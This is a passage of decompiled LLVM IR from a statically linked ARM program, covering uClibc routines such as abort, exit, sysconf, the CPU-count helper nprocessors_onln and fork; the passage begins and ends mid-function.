  %v4_146b8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 64) to i32*), align 4
  store i32 %v4_146b8, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v4_146b8, i32* @r0, align 4
  %v0_146c8 = call i32 @__malloc_consolidate()
  %v0_146cc = load i32, i32* @r4, align 4
  %v0_146d0 = load i32, i32* @r5, align 4
  %v2_146d8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_146d8, i32* @r4, align 4
  store i32 %v6_146a8, i32* @r5, align 4
  %v2_146dc = call i32 @__malloc_trim(i32 %v0_146cc, i32 %v0_146d0)
  %v0_146e0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_146e0, label %bb, label %.thread

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v4_146e4 = phi i32 [ %v2_146dc, %entry ], [ 0, %bb ]
  ret i32 %v4_146e4

; uselistorder directives
  uselistorder i32 (i32, i32)* @__malloc_trim, { 1, 0 }
  uselistorder i32 ()* @__malloc_consolidate, { 3, 2, 1, 0 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 64) to i32*), { 17, 3, 2, 7, 8, 9, 10, 11, 6, 12, 5, 13, 0, 14, 15, 4, 16, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* @r5, align 4
  %v4_14700 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 16) to i32*), align 4
  store i32 83724, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_14700)
  store i32 32, i32* %stack_var_-8, align 4
  %v4_14728 = call i32 @__GI_sigprocmask(i32 1, i32* nonnull %stack_var_-8, i32 0)
  %v0_14730 = load i32, i32* @r5, align 4
  %v2_14730 = add i32 %v0_14730, 636
  %v3_14730 = inttoptr i32 %v2_14730 to i32*
  %v4_14730 = load i32, i32* %v3_14730, align 4
  %v2_14734 = icmp eq i32 %v4_14730, 0
  br i1 %v2_14734, label %dec_label_pc_1473c, label %dec_label_pc_1477c

dec_label_pc_1473c:                               ; preds = %entry
  store i32 1, i32* %v3_14730, align 4
  br label %dec_label_pc_14744

dec_label_pc_14744:                               ; preds = %dec_label_pc_1478c, %dec_label_pc_1473c
  %v0_14748 = load i32, i32* @r5, align 4
  %v2_14748 = add i32 %v0_14748, 212
  store i32 %v2_14748, i32* @r4, align 4
  %v2_14754 = add i32 %v0_14748, 68
  %v3_14754 = inttoptr i32 %v2_14754 to i32*
  %v4_14754 = load i32, i32* %v3_14754, align 4
  call void @__pseudo_branch(i32 %v4_14754)
  %v1_14764 = call i32 @__GI_raise(i32 6)
  %v0_14770 = load i32, i32* @r5, align 4
  %v2_14770 = add i32 %v0_14770, 16
  %v3_14770 = inttoptr i32 %v2_14770 to i32*
  %v4_14770 = load i32, i32* %v3_14770, align 4
  store i32 83836, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_14770)
  %v0_14780.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1477c

dec_label_pc_1477c:                               ; preds = %entry, %dec_label_pc_14744
  %v1_14794 = phi i32 [ %v0_14730, %entry ], [ %v0_14780.pre, %dec_label_pc_14744 ]
  %v2_14780 = add i32 %v1_14794, 636
  %v3_14780 = inttoptr i32 %v2_14780 to i32*
  %v4_14780 = load i32, i32* %v3_14780, align 4
  %v7_14784 = icmp eq i32 %v4_14780, 1
  br i1 %v7_14784, label %dec_label_pc_1478c, label %dec_label_pc_147c8

dec_label_pc_1478c:                               ; preds = %dec_label_pc_1477c
  %v2_1478c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_1478c, i32* @r4, align 4
  store i32 2, i32* %v3_14780, align 4
  %v3_147a4 = bitcast i32* %stack_var_-28 to i8*
  %v4_147a4 = call i32 @__GI_memset(i8* %v3_147a4, i32 0, i32 20)
  %v3_147c0 = call i32 @__libc_sigaction(i32 6, i32 %v2_1478c, i32 0)
  br label %dec_label_pc_14744

dec_label_pc_147c8:                               ; preds = %dec_label_pc_1477c
  %v7_147c8 = icmp eq i32 %v4_14780, 2
  br i1 %v7_147c8, label %dec_label_pc_147d0, label %dec_label_pc_147dc

dec_label_pc_147d0:                               ; preds = %dec_label_pc_147c8
  store i32 3, i32* %v3_14780, align 4
  %v0_147d8 = call i32 @abort()
  %v0_147dc.pre = load i32, i32* @r5, align 4
  %v1_147dc.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_147dc

dec_label_pc_147dc:                               ; preds = %dec_label_pc_147c8, %dec_label_pc_147d0
  %v3_147e8 = phi i32 [ 636, %dec_label_pc_147c8 ], [ %v1_147dc.pre, %dec_label_pc_147d0 ]
  %v2_147e8 = phi i32 [ %v1_14794, %dec_label_pc_147c8 ], [ %v0_147dc.pre, %dec_label_pc_147d0 ]
  %v2_147dc = add i32 %v2_147e8, %v3_147e8
  %v3_147dc = inttoptr i32 %v2_147dc to i32*
  %v4_147dc = load i32, i32* %v3_147dc, align 4
  %v7_147e0 = icmp eq i32 %v4_147dc, 3
  br i1 %v7_147e0, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_147dc
  store i32 4, i32* %v3_147dc, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_147dc, %bb
  call void @__pseudo_cond_branch(i1 %v7_147e0, i32 ptrtoint (i32* @global_var_161b0.622 to i32))
  br label %dec_label_pc_147f4

dec_label_pc_147f4:                               ; preds = %dec_label_pc_147f4, %.thread2
  %v0_147f4 = call i32 @abort()
  br label %dec_label_pc_147f4

; uselistorder directives
  uselistorder i32* %v3_14780, { 1, 0, 2 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 16) to i32*), { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_147dc, { 1, 0 }
  uselistorder label %dec_label_pc_1477c, { 1, 0 }
}

define i32 @function_14800(i64* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14800:
  %tmp = ptrtoint i64* %arg1 to i32
  %v0_14800 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14800, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_14800
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_14800, %bb
  %v4_1480c = phi i32 [ %tmp, %dec_label_pc_14800 ], [ 0, %bb ]
  ret i32 %v4_1480c

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* @r5, align 4
  %v4_1481c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 140) to i32*), align 4
  store i32 %v4_1481c, i32* @r4, align 4
  %v2_14824 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r6, align 4
  %v4_1483c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_1483c)
  %v0_14850 = load i32, i32* @r5, align 4
  %v2_14850 = add i32 %v0_14850, 16
  %v3_14850 = inttoptr i32 %v2_14850 to i32*
  %v4_14850 = load i32, i32* %v3_14850, align 4
  call void @__pseudo_branch(i32 %v4_14850)
  %v0_14860 = load i32, i32* @r5, align 4
  %v2_14860 = add i32 %v0_14860, 640
  %v3_14860 = inttoptr i32 %v2_14860 to i32*
  %v4_14860 = load i32, i32* %v3_14860, align 4
  %v2_14868 = icmp eq i32 %v4_14860, 0
  br i1 %v2_14868, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v2_14874 = xor i1 %v2_14868, true
  call void @__pseudo_cond_branch(i1 %v2_14874, i32 %v4_14860)
  store i32 %v2_14824, i32* @r0, align 4
  %v0_14884 = load i32, i32* @r5, align 4
  %v2_14884 = add i32 %v0_14884, 44
  %v3_14884 = inttoptr i32 %v2_14884 to i32*
  %v4_14884 = load i32, i32* %v3_14884, align 4
  call void @__pseudo_branch(i32 %v4_14884)
  %v0_14890 = call i32 @__GI___uClibc_fini()
  %v0_14898 = load i32, i32* @r5, align 4
  %v2_14898 = add i32 %v0_14898, -49080
  %v2_148a0 = icmp eq i32 %v2_14898, 0
  br i1 %v2_148a0, label %bb9, label %bb8

bb8:                                              ; preds = %.thread
  br label %bb9

bb9:                                              ; preds = %.thread, %bb8
  %v2_148a8 = xor i1 %v2_148a0, true
  call void @__pseudo_cond_branch(i1 %v2_148a8, i32 %v2_14898)
  %v0_148ac = load i32, i32* @r6, align 4
  %v1_148b0 = call i32 @__GI__exit(i32 %v0_148ac)
  %v0_148b4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_148b4, label %bb10, label %.thread6

bb10:                                             ; preds = %bb9
  %v5_148b4 = udiv i32 %v4_14884, 8388608
  %v6_148b4 = and i32 %v1_148b0, %v5_148b4
  store i32 %v6_148b4, i32* @lr, align 4
  br label %.thread6

.thread6:                                         ; preds = %bb9, %bb10
  %v4_148cc = phi i32 [ %v1_148b0, %bb9 ], [ 0, %bb10 ]
  ret i32 %v4_148cc

; uselistorder directives
  uselistorder i32 %v1_148b0, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @nprocessors_onln() local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 -34008), i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_148f4 = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 -34008))
  store i32 %v1_148f4, i32* @r6, align 4
  %v2_148f8 = icmp eq i32 %v1_148f4, 0
  br i1 %v2_148f8, label %dec_label_pc_14978, label %dec_label_pc_14900

dec_label_pc_14900:                               ; preds = %entry
  store i32 276, i32* @sl, align 4
  %v0_14908 = load i32, i32* @r4, align 4
  %v2_14908 = add i32 %v0_14908, -35916
  store i32 %v2_14908, i32* @r8, align 4
  %v2_1490c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_1490c, i32* @r7, align 4
  br label %bb18

dec_label_pc_14914:                               ; preds = %bb18
  %v3_14914 = load i32, i32* %stack_var_-36, align 4
  %v1_14918 = inttoptr i32 %v3_14914 to i32*
  %v2_14918 = load i32, i32* %v1_14918, align 4
  %v1_1491c = inttoptr i32 %v2_14918 to i8*
  %v2_1491c = load i8, i8* %v1_1491c, align 1
  %v7_14920 = icmp eq i8 %v2_1491c, 99
  br i1 %v7_14920, label %dec_label_pc_14928, label %.backedge3

dec_label_pc_14928:                               ; preds = %dec_label_pc_14914
  %v1_14928 = add i32 %v2_14918, 1
  %v2_14928 = inttoptr i32 %v1_14928 to i8*
  %v3_14928 = load i8, i8* %v2_14928, align 1
  %v7_1492c = icmp eq i8 %v3_14928, 112
  br i1 %v7_1492c, label %dec_label_pc_14934, label %.backedge3

dec_label_pc_14934:                               ; preds = %dec_label_pc_14928
  %v1_14934 = add i32 %v2_14918, 2
  %v2_14934 = inttoptr i32 %v1_14934 to i8*
  %v3_14934 = load i8, i8* %v2_14934, align 1
  %v7_14938 = icmp eq i8 %v3_14934, 117
  br i1 %v7_14938, label %dec_label_pc_14940, label %.backedge3

dec_label_pc_14940:                               ; preds = %dec_label_pc_14934
  %v1_14940 = add i32 %v2_14918, 3
  %v2_14940 = inttoptr i32 %v1_14940 to i8*
  %v3_14940 = load i8, i8* %v2_14940, align 1
  %v4_14940 = zext i8 %v3_14940 to i32
  %v0_14944 = load i32, i32* @r4, align 4
  %v1_14944 = load i32, i32* @sl, align 4
  %v2_14944 = add i32 %v1_14944, %v0_14944
  %v3_14944 = inttoptr i32 %v2_14944 to i32*
  %v4_14944 = load i32, i32* %v3_14944, align 4
  %v2_14948 = mul nuw nsw i32 %v4_14940, 2
  %v2_1494c = add i32 %v4_14944, %v2_14948
  %v3_1494c = inttoptr i32 %v2_1494c to i16*
  %v4_1494c = load i16, i16* %v3_1494c, align 2
  %v1_14950 = and i16 %v4_1494c, 8
  %v2_14950 = icmp eq i16 %v1_14950, 0
  br i1 %v2_14950, label %.backedge3, label %bb

bb:                                               ; preds = %dec_label_pc_14940
  %v1_14954 = load i32, i32* @r5, align 4
  %v2_14954 = add i32 %v1_14954, 1
  store i32 %v2_14954, i32* @r5, align 4
  br label %.backedge3

.backedge3:                                       ; preds = %bb, %dec_label_pc_14940, %dec_label_pc_14914, %dec_label_pc_14928, %dec_label_pc_14934
  %v0_14958.pre = load i32, i32* @r6, align 4
  %v0_14964.pre = load i32, i32* @r8, align 4
  br label %bb18

bb18:                                             ; preds = %.backedge3, %dec_label_pc_14900
  %v0_14964 = phi i32 [ %v0_14964.pre, %.backedge3 ], [ %v2_14908, %dec_label_pc_14900 ]
  %v0_14958 = phi i32 [ %v0_14958.pre, %.backedge3 ], [ %v1_148f4, %dec_label_pc_14900 ]
  %v4_14968 = inttoptr i32 %v0_14958 to i32*
  %v5_14968 = call i32 @__GI_config_read(i32* %v4_14968, i32 %v2_1490c, i32 258, i32 %v0_14964)
  %v2_1496c = icmp eq i32 %v5_14968, 0
  br i1 %v2_1496c, label %dec_label_pc_149dc, label %dec_label_pc_14914

dec_label_pc_14978:                               ; preds = %entry
  %v0_1497c = load i32, i32* @r4, align 4
  %v2_1497c = add i32 %v0_1497c, -33996
  store i32 %v2_1497c, i32* @r0, align 4
  %v1_14980 = call i32 @__GI_config_open(i32 %v2_1497c)
  store i32 %v1_14980, i32* @r6, align 4
  %v2_14984 = icmp eq i32 %v1_14980, 0
  br i1 %v2_14984, label %bb19, label %dec_label_pc_14990

bb19:                                             ; preds = %dec_label_pc_14978
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_149dc

dec_label_pc_14990:                               ; preds = %dec_label_pc_14978
  %v0_14994 = load i32, i32* @r4, align 4
  %v2_14994 = add i32 %v0_14994, -33980
  store i32 %v2_14994, i32* @r8, align 4
  %v2_1499c = add i32 %v0_14994, -33944
  store i32 %v2_1499c, i32* @r7, align 4
  %v2_149a0 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_149a0, i32* @r4, align 4
  br label %bb21

dec_label_pc_149a8:                               ; preds = %bb21
  %v0_149d4 = load i32, i32* @r8, align 4
  %v3_149a8 = load i32, i32* %stack_var_-36, align 4
  %v1_149ac = inttoptr i32 %v3_149a8 to i32*
  %v2_149ac = load i32, i32* %v1_149ac, align 4
  store i32 %v2_149ac, i32* @r1, align 4
  %v2_149b0 = inttoptr i32 %v0_149d4 to i8*
  %v3_149b0 = call i32 @__GI_strcoll(i8* %v2_149b0, i32 %v2_149ac)
  %v2_149b4 = icmp eq i32 %v3_149b0, 0
  br i1 %v2_149b4, label %bb20, label %.backedge

bb20:                                             ; preds = %dec_label_pc_149a8
  %v1_149b8 = load i32, i32* @r5, align 4
  %v2_149b8 = add i32 %v1_149b8, 1
  store i32 %v2_149b8, i32* @r5, align 4
  br label %.backedge

.backedge:                                        ; preds = %bb20, %dec_label_pc_149a8
  %v0_149c4.pre = load i32, i32* @r7, align 4
  %v0_149c8.pre = load i32, i32* @r6, align 4
  br label %bb21

bb21:                                             ; preds = %.backedge, %dec_label_pc_14990
  %v0_149c8 = phi i32 [ %v0_149c8.pre, %.backedge ], [ %v1_14980, %dec_label_pc_14990 ]
  %v0_149c4 = phi i32 [ %v0_149c4.pre, %.backedge ], [ %v2_1499c, %dec_label_pc_14990 ]
  %v4_149cc = inttoptr i32 %v0_149c8 to i32*
  %v5_149cc = call i32 @__GI_config_read(i32* %v4_149cc, i32 %v2_149a0, i32 459266, i32 %v0_149c4)
  %v2_149d0 = icmp eq i32 %v5_149cc, 0
  br i1 %v2_149d0, label %dec_label_pc_149dc, label %dec_label_pc_149a8

dec_label_pc_149dc:                               ; preds = %bb18, %bb21, %bb19
  %v0_149dc = load i32, i32* @r6, align 4
  %v1_149e0 = inttoptr i32 %v0_149dc to i32*
  %v2_149e0 = call i32 @__GI_config_close(i32* %v1_149e0)
  %v0_149e4 = load i32, i32* @r5, align 4
  %v2_149e4 = icmp eq i32 %v0_149e4, 0
  %.v0_149e4 = select i1 %v2_149e4, i32 1, i32 %v0_149e4
  ret i32 %.v0_149e4

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 0, 3, 1, 4, 2 }
  uselistorder i32 (i32)* @__GI_config_open, { 1, 0 }
  uselistorder label %dec_label_pc_149dc, { 1, 2, 0 }
  uselistorder label %.backedge3, { 0, 1, 4, 3, 2 }
}

define i32 @sysconf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg1, 241
  br i1 %tmp, label %bb, label %dec_label_pc_14e10

bb:                                               ; preds = %entry
  %v7_14a34 = mul i32 %arg1, 4
  %v8_14a34 = add i32 %v7_14a34, ptrtoint (i32* @global_var_14a3c.642 to i32)
  call void @__pseudo_branch(i32 %v8_14a34)
  br label %dec_label_pc_14e10

dec_label_pc_14e10:                               ; preds = %bb, %entry
  %v0_14e14 = call i32 @__aeabi_read_tp()
  %v3_14e18 = load i16, i16* @global_var_23424.488, align 2
  %v4_14e18 = sext i16 %v3_14e18 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_14e24 = add i32 %v4_14e18, %v0_14e14
  %v4_14e24 = inttoptr i32 %v3_14e24 to i32*
  store i32 22, i32* %v4_14e24, align 4
  %v0_15008 = load i32, i32* %r1.global-to-local, align 4
  ret i32 %v0_15008

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_15044 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_15044, i32* @ip, align 4
  store i32 13028, i32* %r5.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* %r8.global-to-local, align 4
  %v4_1513416 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 13028) to i32*), align 4
  store i32 %v4_1513416, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1513818 = icmp eq i32 %v4_1513416, 0
  br i1 %v2_1513818, label %dec_label_pc_15140, label %dec_label_pc_15064

dec_label_pc_15064:                               ; preds = %entry, %dec_label_pc_15134.backedge
  store i32 -61441, i32* @ip, align 4
  call void @__pseudo_branch(i32 -61536)
  %v0_15070 = load i32, i32* %r7.global-to-local, align 4
  %v1_15070 = add i32 %v0_15070, 20
  %v2_15070 = inttoptr i32 %v1_15070 to i32*
  %v3_15070 = load i32, i32* %v2_15070, align 4
  store i32 %v3_15070, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15074 = icmp eq i32 %v3_15070, 0
  store i32 %v3_15070, i32* %r4.global-to-local, align 4
  br i1 %v2_15074, label %dec_label_pc_15134.backedge, label %dec_label_pc_15084

dec_label_pc_15134.backedge:                      ; preds = %dec_label_pc_15064, %dec_label_pc_150b0
  %v0_15134 = load i32, i32* %r8.global-to-local, align 4
  %v1_15134 = load i32, i32* %r5.global-to-local, align 4
  %v2_15134 = add i32 %v1_15134, %v0_15134
  %v3_15134 = inttoptr i32 %v2_15134 to i32*
  %v4_15134 = load i32, i32* %v3_15134, align 4
  store i32 %v4_15134, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15138 = icmp eq i32 %v4_15134, 0
  br i1 %v2_15138, label %dec_label_pc_15140, label %dec_label_pc_15064

dec_label_pc_15084:                               ; preds = %dec_label_pc_15064
  %v0_15084 = load i32, i32* %r8.global-to-local, align 4
  %v1_15084 = load i32, i32* %r5.global-to-local, align 4
  %v2_15084 = add i32 %v1_15084, %v0_15084
  %v3_15084 = inttoptr i32 %v2_15084 to i32*
  %v4_15084 = load i32, i32* %v3_15084, align 4
  %v1_15088 = add i32 %v4_15084, 20
  store i32 %v1_15088, i32* %r2.global-to-local, align 4
  %v1_1508c132 = inttoptr i32 %v1_15088 to i32*
  %v2_1508c133 = load i32, i32* %v1_1508c132, align 4
  store i32 %v2_1508c133, i32* %r3.global-to-local, align 4
  %v3_15090135 = icmp uge i32 %v2_1508c133, %v3_15070
  store i1 %v3_15090135, i1* %cpsr_c.global-to-local, align 1
  %v9_15090141 = icmp eq i32 %v2_1508c133, %v3_15070
  br i1 %v9_15090141, label %dec_label_pc_15098, label %dec_label_pc_150b0

dec_label_pc_15098:                               ; preds = %dec_label_pc_15084, %dec_label_pc_15098.dec_label_pc_1508c_crit_edge
  %v0_15098142 = phi i32 [ %v1_15090.pre, %dec_label_pc_15098.dec_label_pc_1508c_crit_edge ], [ %v3_15070, %dec_label_pc_15084 ]
  store i32 %v0_15098142, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_150a8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_150a8, label %dec_label_pc_150ac, label %dec_label_pc_15098.dec_label_pc_1508c_crit_edge

dec_label_pc_15098.dec_label_pc_1508c_crit_edge:  ; preds = %dec_label_pc_15098
  %v0_1508c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15090.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1508c = inttoptr i32 %v0_1508c.pre to i32*
  %v2_1508c = load i32, i32* %v1_1508c, align 4
  store i32 %v2_1508c, i32* %r3.global-to-local, align 4
  %v3_15090 = icmp uge i32 %v2_1508c, %v1_15090.pre
  store i1 %v3_15090, i1* %cpsr_c.global-to-local, align 1
  %v9_15090 = icmp eq i32 %v2_1508c, %v1_15090.pre
  br i1 %v9_15090, label %dec_label_pc_15098, label %dec_label_pc_150b0

dec_label_pc_150ac:                               ; preds = %dec_label_pc_15098
  %v0_150ac = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_150ac, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_150b0

dec_label_pc_150b0:                               ; preds = %dec_label_pc_15084, %dec_label_pc_15098.dec_label_pc_1508c_crit_edge, %dec_label_pc_150ac
  %v0_150b0 = phi i32 [ %v0_150ac, %dec_label_pc_150ac ], [ %v2_1508c133, %dec_label_pc_15084 ], [ %v2_1508c, %dec_label_pc_15098.dec_label_pc_1508c_crit_edge ]
  %v1_150b0 = phi i32 [ %v0_150ac, %dec_label_pc_150ac ], [ %v3_15070, %dec_label_pc_15084 ], [ %v1_15090.pre, %dec_label_pc_15098.dec_label_pc_1508c_crit_edge ]
  %v3_150b0 = icmp uge i32 %v0_150b0, %v1_150b0
  store i1 %v3_150b0, i1* %cpsr_c.global-to-local, align 1
  %v9_150b0 = icmp eq i32 %v0_150b0, %v1_150b0
  br i1 %v9_150b0, label %dec_label_pc_150b8, label %dec_label_pc_15134.backedge

dec_label_pc_150b8:                               ; preds = %dec_label_pc_150b0
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_150cc = ptrtoint i32* %stack_var_-88 to i32
  br label %dec_label_pc_150bc

dec_label_pc_150bc:                               ; preds = %dec_label_pc_15124, %dec_label_pc_150b8
  %v0_150bc = load i32, i32* %r7.global-to-local, align 4
  %v1_150bc = add i32 %v0_150bc, 4
  %v2_150bc = inttoptr i32 %v1_150bc to i32*
  %v3_150bc = load i32, i32* %v2_150bc, align 4
  store i32 %v3_150bc, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_150c0 = icmp eq i32 %v3_150bc, 0
  br i1 %v2_150c0, label %bb72, label %bb

bb:                                               ; preds = %dec_label_pc_150bc
  br label %bb72

bb72:                                             ; preds = %dec_label_pc_150bc, %bb
  %v2_150c8 = xor i1 %v2_150c0, true
  call void @__pseudo_cond_branch(i1 %v2_150c8, i32 %v3_150bc)
  %v0_150d0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_150d0, i32* %stack_var_-88, align 4
  %v1_150d4 = inttoptr i32 %v0_150d0 to i32*
  %v2_150d4 = load i32, i32* %v1_150d4, align 4
  store i32 %v2_150d4, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_150d8 = icmp eq i32 %v2_150d4, 0
  store i32 %v2_150cc, i32* %r5.global-to-local, align 4
  br i1 %v2_150d8, label %dec_label_pc_15144.loopexit, label %dec_label_pc_150ec

dec_label_pc_150ec:                               ; preds = %bb72
  %v1_150ec = add i32 %v2_150d4, 20
  store i32 %v1_150ec, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_150f0

dec_label_pc_150f0:                               ; preds = %dec_label_pc_15124.dec_label_pc_150f0_crit_edge, %dec_label_pc_150ec
  %v0_150f4 = phi i32 [ %v0_150f4.pre, %dec_label_pc_15124.dec_label_pc_150f0_crit_edge ], [ %v1_150ec, %dec_label_pc_150ec ]
  %v0_150f0 = phi i32 [ %v0_150f0.pre, %dec_label_pc_15124.dec_label_pc_150f0_crit_edge ], [ %v2_150d4, %dec_label_pc_150ec ]
  %v1_150f0 = add i32 %v0_150f0, 20
  %v2_150f0 = inttoptr i32 %v1_150f0 to i32*
  %v3_150f0 = load i32, i32* %v2_150f0, align 4
  store i32 %v0_150f4, i32* %r2.global-to-local, align 4
  store i32 %v3_150f0, i32* %r4.global-to-local, align 4
  %v1_15100119 = inttoptr i32 %v0_150f4 to i32*
  %v2_15100120 = load i32, i32* %v1_15100119, align 4
  store i32 %v2_15100120, i32* %r3.global-to-local, align 4
  %v3_15104122 = icmp uge i32 %v2_15100120, %v3_150f0
  store i1 %v3_15104122, i1* %cpsr_c.global-to-local, align 1
  %v9_15104128 = icmp eq i32 %v2_15100120, %v3_150f0
  br i1 %v9_15104128, label %dec_label_pc_1510c, label %dec_label_pc_15124

dec_label_pc_1510c:                               ; preds = %dec_label_pc_150f0, %dec_label_pc_1510c.dec_label_pc_15100_crit_edge
  %v0_1510c129 = phi i32 [ %v1_15104.pre, %dec_label_pc_1510c.dec_label_pc_15100_crit_edge ], [ %v3_150f0, %dec_label_pc_150f0 ]
  store i32 %v0_1510c129, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1511c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1511c, label %dec_label_pc_15120, label %dec_label_pc_1510c.dec_label_pc_15100_crit_edge

dec_label_pc_1510c.dec_label_pc_15100_crit_edge:  ; preds = %dec_label_pc_1510c
  %v0_15100.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15104.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15100 = inttoptr i32 %v0_15100.pre to i32*
  %v2_15100 = load i32, i32* %v1_15100, align 4
  store i32 %v2_15100, i32* %r3.global-to-local, align 4
  %v3_15104 = icmp uge i32 %v2_15100, %v1_15104.pre
  store i1 %v3_15104, i1* %cpsr_c.global-to-local, align 1
  %v9_15104 = icmp eq i32 %v2_15100, %v1_15104.pre
  br i1 %v9_15104, label %dec_label_pc_1510c, label %dec_label_pc_15124

dec_label_pc_15120:                               ; preds = %dec_label_pc_1510c
  %v0_15120 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15120, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15124

dec_label_pc_15124:                               ; preds = %dec_label_pc_150f0, %dec_label_pc_1510c.dec_label_pc_15100_crit_edge, %dec_label_pc_15120
  %v0_15124 = phi i32 [ %v0_15120, %dec_label_pc_15120 ], [ %v2_15100120, %dec_label_pc_150f0 ], [ %v2_15100, %dec_label_pc_1510c.dec_label_pc_15100_crit_edge ]
  %v1_15124 = phi i32 [ %v0_15120, %dec_label_pc_15120 ], [ %v3_150f0, %dec_label_pc_150f0 ], [ %v1_15104.pre, %dec_label_pc_1510c.dec_label_pc_15100_crit_edge ]
  %v3_15124 = icmp uge i32 %v0_15124, %v1_15124
  store i1 %v3_15124, i1* %cpsr_c.global-to-local, align 1
  %v9_15124 = icmp eq i32 %v0_15124, %v1_15124
  store i32 %v2_150cc, i32* %r4.global-to-local, align 4
  br i1 %v9_15124, label %dec_label_pc_150bc, label %dec_label_pc_15124.dec_label_pc_150f0_crit_edge

dec_label_pc_15124.dec_label_pc_150f0_crit_edge:  ; preds = %dec_label_pc_15124
  %v0_150f0.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_150f4.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_150f0

dec_label_pc_15140:                               ; preds = %dec_label_pc_15134.backedge, %entry
